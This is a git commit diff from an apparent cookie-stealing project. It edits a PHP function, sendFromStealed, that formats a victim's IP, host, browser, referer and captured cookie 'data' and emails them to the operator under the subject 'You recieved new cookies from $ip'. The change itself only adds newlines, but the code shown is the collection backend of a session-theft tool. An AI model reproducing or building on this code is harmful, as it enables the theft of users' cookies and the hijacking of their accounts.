ba147346d6f44f8daab66eb24f718b8d6be760be
Elimination <lorder222@Rambler.ru>
2016-04-24 18:53:19 +0700

    Add missing newlines

--- inc/functions.php
+++ inc/functions.php
@@ -9,12 +9,12 @@ function sendFromStealed($ip, $host, $navigator, $date, $time, $referer, $data)
 {
 	$st = '';
 	// Write stealed data into the string array
-	$st .= "IP: $ip";
-	$st .= "HOST: $host";
-	$st .= "Browser: $navigator";
-	$st .= "Date: $date";
-	$st .= "Time: $time";
-	$st .= "Referer: $referer";
+	$st .= "IP: $ip\n";
+	$st .= "HOST: $host\n";
+	$st .= "Browser: $navigator\n";
+	$st .= "Date: $date\n";
+	$st .= "Time: $time\n";
+	$st .= "Referer: $referer\n";
 	$st .= "Data: $data";
 	// Send recieved data on e-mail
 	mail($site['mail'], "You recieved new cookies from $ip", $st);
